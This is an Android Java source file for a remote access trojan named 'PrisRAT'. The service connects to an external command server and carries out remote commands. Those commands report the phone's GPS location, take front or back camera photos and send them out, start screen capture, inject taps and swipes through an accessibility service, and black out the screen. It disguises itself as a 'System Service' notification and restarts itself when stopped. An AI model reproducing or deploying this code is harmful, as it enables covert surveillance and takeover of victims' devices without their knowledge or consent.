package com.pris.rat.tool;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.UUID;

public class RatService extends Service {
    private static final String TAG = "PrisRAT";
    private static final String SERVER_URL = "https://pris-rat.onrender.com";
    private Socket socket;
    private String deviceId;
    private LocationModule locationModule;
    private CameraModule cameraModule;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getDeviceId();
        startForeground(1, buildNotification());

        ScreenShareService.deviceId = deviceId;

        locationModule = new LocationModule(this, (lat, lon) -> {
            try {
                JSONObject resp = new JSONObject();
                resp.put("id", deviceId);
                resp.put("type", "location");
                resp.put("lat", lat);
                resp.put("lon", lon);
                if (socket != null && socket.connected()) socket.emit("response", resp);
            } catch (Exception ignored) {}
        });

        cameraModule = new CameraModule(this, base64 -> {
            try {
                JSONObject resp = new JSONObject();
                resp.put("id", deviceId);
                resp.put("type", "camera");
                resp.put("image", base64);
                if (socket != null && socket.connected()) socket.emit("response", resp);
            } catch (Exception ignored) {}
        });

        connectSocket();
    }

    private String getDeviceId() {
        String id = getSharedPreferences("pris", MODE_PRIVATE).getString("did", null);
        if (id == null) {
            id = UUID.randomUUID().toString().substring(0, 8);
            getSharedPreferences("pris", MODE_PRIVATE).edit().putString("did", id).apply();
        }
        return id;
    }

    private Notification buildNotification() {
        String CH = "pris_svc";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void connectSocket() {
        try {
            socket = IO.socket(SERVER_URL);
            ScreenShareService.socket = socket;

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected");
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("id", deviceId);
                    reg.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                    reg.put("android", Build.VERSION.RELEASE);
                    reg.put("battery", 100);
                    socket.emit("register", reg);
                } catch (Exception ignored) {}
            });

            socket.on("execute", args -> {
                try {
                    JSONObject cmd = (JSONObject) args[0];
                    String action = cmd.getString("action");
                    handleCommand(action, cmd);
                } catch (Exception e) {
                    Log.e(TAG, "Cmd error", e);
                }
            });

            socket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "URI error", e);
        }
    }

    private void handleCommand(String action, JSONObject cmd) {
        switch (action) {
            case "location":
                locationModule.getLocation();
                break;
            case "camera":
                cameraModule.capturePhoto(cmd.optBoolean("front", false));
                break;
            case "request_screen":
                Intent perm = new Intent(this, PermissionActivity.class);
                perm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(perm);
                break;
            case "touch":
                float rx = (float) cmd.optDouble("x", 0);
                float ry = (float) cmd.optDouble("y", 0);
                boolean relative = cmd.optBoolean("relative", false);
                handleTouch(rx, ry, relative);
                break;
            case "swipe":
                PrisAccessibility.performSwipe(
                    (float) cmd.optDouble("x1", 0),
                    (float) cmd.optDouble("y1", 0),
                    (float) cmd.optDouble("x2", 0),
                    (float) cmd.optDouble("y2", 0));
                break;
            case "blackout":
                startService(new Intent(this, OverlayService.class));
                break;
            case "unblackout":
                stopService(new Intent(this, OverlayService.class));
                break;
            case "stop_screen":
                stopService(new Intent(this, ScreenShareService.class));
                break;
        }
    }

    private void handleTouch(float x, float y, boolean relative) {
        try {
            int screenW = getResources().getDisplayMetrics().widthPixels;
            int screenH = getResources().getDisplayMetrics().heightPixels;
            float realX = relative ? x * screenW : x;
            float realY = relative ? y * screenH : y;
            PrisAccessibility.performTap(realX, realY);
        } catch (Exception e) {
            Log.e(TAG, "Touch error", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) socket.disconnect();
        Intent restart = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}